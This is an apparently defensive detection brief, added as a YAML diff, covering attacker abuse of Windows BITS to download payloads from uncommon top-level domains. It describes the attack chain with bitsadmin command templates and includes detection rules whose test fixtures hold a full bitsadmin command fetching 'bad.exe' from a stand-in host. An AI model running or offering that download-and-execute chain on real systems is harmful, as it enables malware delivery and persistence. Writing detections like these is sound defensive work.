@@ -1,0 +1,114 @@
+id: brief-2024-01-02-bits-uncommon-tld
+slug: 2024-01-bits-uncommon-tld
+title: BITS Transfer Job with Uncommon or Suspicious Remote TLD
+summary: Attackers abuse the Background Intelligent Transfer Service (BITS) to download malicious payloads from uncommon top-level domains (TLDs) for defense evasion and persistence.
+severity: medium
+published_at: "2024-01-02T12:00:00Z"
+content: |
+    ## Overview
+
+    The Background Intelligent Transfer Service (BITS) is a Windows service that transfers files in the background. Attackers abuse BITS to download malware, stage files, or maintain persistence. This activity leverages BITS to transfer files from unusual or suspicious top-level domains (TLDs). This technique allows attackers to evade traditional security measures that monitor common download sources. Observed usage of BITS for malicious purposes has been documented and continues to be a relevant threat for Windows environments. This detection focuses on identifying BITS downloads originating from uncommon TLDs, which is indicative of potentially malicious activity.
+
+    ## Attack Chain
+
+    1. An attacker gains initial access to the target system (e.g., via phishing or exploit).
+    2. The attacker uses a scripting language (e.g., PowerShell) or command-line interface (cmd.exe) to interact with the BITSAdmin.exe or BITSController.psm1.
+    3. The attacker creates a new BITS transfer job using `bitsadmin.exe /create <job_name>`.
+    4. The attacker adds a remote file to the BITS job using `bitsadmin.exe /addfile <job_name> <remote_url> <local_file>`. The remote_url points to a file hosted on an unusual TLD.
+    5. The attacker executes the BITS job using `bitsadmin.exe /resume <job_name>`.
+    6. BITS downloads the file from the remote URL to the specified local file path.
+    7. The attacker executes the downloaded payload.
+    8. The attacker establishes persistence by creating a scheduled task or registry entry that utilizes the downloaded file.
+
+    ## Impact
+
+    Successful exploitation leads to malware infection, data exfiltration, or system compromise. Attackers can use BITS downloads to bypass security controls and establish persistent access. Organizations in any sector are potentially vulnerable. The impact ranges from minor disruptions to complete system compromise, depending on the attacker's objectives and the nature of the downloaded payload.
+tags:
+    - bits
+    - file-transfer
+    - persistence
+    - defense-evasion
+references:
+    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1197/T1197.md
+    - https://twitter.com/malmoeb/status/1535142803075960832
+rules:
+    - title: BITS Transfer Job With Suspicious Remote TLD
+      description: Detects a suspicious download using the BITS client from a FQDN that is not commonly associated with legitimate software updates or downloads.
+      logsource:
+        category: ""
+        product: windows
+        service: bits-client
+      detection:
+        condition: selection and not 1 of filter_main_generic*
+        filter_main_generic:
+            RemoteName|contains:
+                - .azureedge.net/
+                - .com/
+                - .sfx.ms/
+                - download.mozilla.org/
+                - cdn.onenote.net/
+                - cdn.office.net/
+                - tscdn.m365.static.microsoft/
+        selection:
+            EventID: 16403
+      level: medium
+      tags:
+        - attack.defense-evasion
+        - attack.persistence
+        - attack.t1197
+      tests:
+        positive:
+            - name: BITS download from uncommon TLD
+              data:
+                - EventID: 16403
+                  RemoteName: http://example.shop/evil.exe
+        negative:
+            - name: BITS download from Microsoft CDN
+              data:
+                - EventID: 16403
+                  RemoteName: http://cdn.office.net/setup.exe
+    - title: BITSAdmin Create Job with Suspicious URL
+      description: Detects the creation of a BITS job via bitsadmin.exe with a suspicious URL.
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        condition: selection_img and selection_cli and not 1 of filter_whitelist*
+        filter_whitelist:
+            CommandLine|contains:
+                - .azureedge.net/
+                - .com/
+                - .sfx.ms/
+                - download.mozilla.org/
+                - cdn.onenote.net/
+                - cdn.office.net/
+                - tscdn.m365.static.microsoft/
+        selection_cli:
+            CommandLine|contains: /addfile
+        selection_img:
+            Image|endswith: \bitsadmin.exe
+      level: medium
+      tags:
+        - attack.defense-evasion
+        - attack.persistence
+        - attack.t1197
+      tests:
+        positive:
+            - name: Bitsadmin creates job with uncommon domain
+              data:
+                - CommandLine: bitsadmin.exe /create evil_job && bitsadmin.exe /addfile evil_job http://example.shop/bad.exe C:\temp\bad.exe && bitsadmin.exe /resume evil_job
+                  Image: C:\Windows\System32\bitsadmin.exe
+        negative:
+            - name: Bitsadmin creates job with common TLD
+              data:
+                - CommandLine: bitsadmin.exe /create good_job && bitsadmin.exe /addfile good_job http://cdn.office.net/good.exe C:\temp\good.exe && bitsadmin.exe /resume good_job
+                  Image: C:\Windows\System32\bitsadmin.exe
+ttps:
+    - tactic_id: TA0005
+      tactic_name: Defense Evasion
+      technique_id: T1197
+      technique_name: BITS Jobs
+    - tactic_id: TA0003
+      tactic_name: Persistence
+      technique_id: T1197
+      technique_name: BITS Jobs
